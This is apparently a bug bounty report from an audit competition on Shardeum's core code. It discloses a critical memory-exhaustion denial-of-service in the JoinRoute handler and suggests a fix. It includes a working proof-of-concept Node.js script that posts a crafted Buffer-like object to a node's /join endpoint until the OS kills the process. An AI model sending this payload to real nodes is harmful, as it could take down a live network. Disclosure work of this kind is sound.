# #39191 \[BC-Critical] JoinRoute: Attacker reachable input serialization

**Submitted on Jan 24th 2025 at 12:04:06 UTC by @riproprip for** [**Audit Comp | Shardeum: Core III**](https://immunefi.com/audit-competition/audit-comp-shardeum-core-iii)

* **Report ID:** #39191
* **Report Type:** Blockchain/DLT
* **Report severity:** Critical
* **Target:** <https://github.com/shardeum/shardus-core/tree/bugbounty>
* **Impacts:**
  * Network not being able to confirm new transactions (total network shutdown)

## Description

## Brief/Intro

JoinRoute allows an attacker to oom reap a node.

## Vulnerability Details

JoinRoute trusts and serializes attacker controlled input before verifying the input.

The attacker can essentially describe in few bytes a memory structure that takes many bytes when serializing. This is a problem because it allows an attacker to allocate all the free memory till the OS has to step in and kill the process.

It seems that moving L85 to the front of the function and running it against the body would fix the problem. Not sure why shardeum is stringifying and parsing again in the first place?

## Impact Details

Usually just the node process gets killed.\
In rare cases the OS also kills other processes.

## References

The offending[line](https://github.com/shardeum/core/blob/9dae0abe5232ed532a9285da82118b41a04b3711/src/p2p/Join/routes.ts#L82):

## Proof of Concept

## Proof of Concept

### Setup

* Setup shardus and `shardus start N` instances.
* Save attack code under /tmp/1\_attack.js

```
const axios   = require("axios");

let objToSend  = {hello: {type: 'Buffer', data: {0: 1, 1:1, 2:2, length:4294967295}}};
function attack() {
        axios.post("http://localhost:9003/join", objToSend, {timeout: 2000 })
        .then(
             res => {
                     console.log('Status ', res.status);
                     console.log(res.data);
                     process.exit();
             },
             err => {console.log('ERR', err.message);}
     )
}

attack();
```

* install dependencies

```
cd /tmp
npm install axios
```

### run

```
node /tmp/1_attack.js
```

### notes

Please find attached the screenshot of my attack run.

You can see the node at port 9003 using more and more memory.

At a certain point the OS steps in to reap the process (dmesg part of screenshot).
